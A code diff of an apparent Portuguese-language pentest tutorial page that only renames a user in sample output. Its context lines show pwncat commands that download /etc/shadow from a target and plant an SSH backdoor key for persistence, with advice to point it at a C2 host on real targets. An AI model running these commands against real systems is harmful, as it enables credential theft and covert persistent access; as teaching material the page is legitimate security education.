@@ -195,7 +195,7 @@ User www-data may run the following commands on target:
           },
           {
             cmd: "(local) pwncat$ download /etc/shadow ~/loot/target/shadow",
-            out: `[+] downloading /etc/shadow → /home/wallyson/loot/target/shadow
+            out: `[+] downloading /etc/shadow → /home/ana/loot/target/shadow
 [+] downloaded 1.2 KB`,
             outType: "info",
           },
@@ -385,7 +385,7 @@ run persist.authorized_keys --backdoor-key ~/.ssh/id_pwncat.pub
 
 # Aba 3 (testa reentrada limpa)
 ssh -i ~/.ssh/id_pwncat $USER@127.0.0.1 id`}
-        expected={`uid=1000(wallyson) gid=1000(wallyson) groups=1000(wallyson),27(sudo)`}
+        expected={`uid=1000(ana) gid=1000(ana) groups=1000(ana),27(sudo)`}
         verify="Se o ssh -i deu o id sem pedir senha, sua persistência está funcionando. Em alvo real, troque 127.0.0.1 pelo IP do C2 e use chave dedicada por engagement."
       />
 
